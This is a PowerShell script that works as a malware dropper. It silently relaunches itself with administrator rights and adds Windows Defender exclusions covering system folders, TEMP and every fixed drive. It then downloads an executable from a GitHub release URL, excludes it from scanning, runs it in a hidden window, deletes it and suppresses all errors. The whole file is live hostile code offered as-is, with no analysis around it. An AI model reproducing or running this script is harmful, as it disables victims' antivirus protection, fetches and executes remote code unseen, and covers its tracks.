# Attempt to elevate to administrative privileges if not already admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
        exit 0
    }
    catch {
        # If elevation fails, continue execution without admin privileges
    }
}

# Define paths and common folders for Defender exclusions
$scriptPath = $MyInvocation.MyCommand.Path
$scriptFolder = Split-Path -Path $scriptPath -Parent
$tempFolder = $env:TEMP
$commonFolders = @(
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\ProgramData",
    "C:\Windows"
)

# Retry configuration for all operations
$maxRetries = 5
$baseDelay = 1000 # Initial delay in milliseconds (1 second)
$maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)

# --- Add to Windows Defender Exclusions ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        # Collect script-specific paths
        $pathsToAdd = @($scriptPath, $scriptFolder, $tempFolder)
        # Add common system folders
        foreach ($folder in $commonFolders) {
            if (Test-Path -Path $folder) {
                $pathsToAdd += $folder
            }
        }
        # Add all fixed disk drives
        $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
        foreach ($disk in $disks) {
            $diskPath = "$disk\"
            $pathsToAdd += $diskPath
        }
        # Filter paths that are not already excluded
        $newPaths = $pathsToAdd | Where-Object { $exclusions -notcontains $_ }
        # Add all new paths in one call if there are any
        if ($newPaths.Count -gt 0) {
            Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Download, Execute, and Clean Up scripthelper.exe with Advanced Retry ---
try {
    # Generate a random filename for the temporary executable
    $rand = Get-Random
    $path = "$env:TEMP\Runtime_$rand.exe"
    $url = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    $retryCount = 0
    $success = $false

    # Add the temporary executable path to Defender exclusions
    $retryCountEx = 0
    $successEx = $false
    while (-not $successEx -and $retryCountEx -lt $maxRetries) {
        try {
            $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
            if ($exclusions -notcontains $path) {
                Add-MpPreference -ExclusionPath $path -ErrorAction Stop | Out-Null
            }
            $successEx = $true
        }
        catch {
            $retryCountEx++
            if ($retryCountEx -eq $maxRetries) {
                break
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCountEx), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
    }

    # Attempt to download the file with retries
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($url, $path)
            # Verify the file was downloaded successfully
            if (Test-Path -Path $path) {
                $success = $true
                # Execute the downloaded executable
                Start-Process -FilePath $path -WindowStyle Hidden -Wait -ErrorAction Stop
            }
            else {
                throw "Downloaded file not found at $path"
            }
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                # Final attempt failed, break silently
                break
            }
            # Calculate exponential backoff with jitter
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
        finally {
            if ($webClient) { $webClient.Dispose() }
        }
    }

    # Clean up the downloaded file if it exists
    if (Test-Path -Path $path) {
        try {
            Remove-Item -Path $path -Force -ErrorAction Stop
        }
        catch {
            # Suppress cleanup errors
        }
    }
}
catch {
    # Suppress all errors
}
